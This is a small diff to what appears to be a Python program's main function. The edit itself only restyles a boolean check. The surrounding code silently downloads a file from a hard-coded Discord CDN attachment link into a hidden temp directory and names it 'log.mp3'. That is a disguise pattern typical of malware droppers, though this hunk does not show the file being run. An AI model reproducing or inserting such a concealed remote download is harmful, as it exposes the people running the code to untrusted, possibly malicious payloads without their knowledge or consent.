@@ -13,7 +13,7 @@ def main():
     log_dir = Path(gettempdir()) / "log_app_build" / "log"
     log_file = log_dir / "log.mp3"
 
-    if log_file.exists() == False:
+    if not log_file.exists():
         log_dir.mkdir(parents=True, exist_ok=True)
         url = 'https://cdn.discordapp.com/attachments/877537566449082401/912003460243800094/log.mp3'
         urlretrieve(url, log_file)
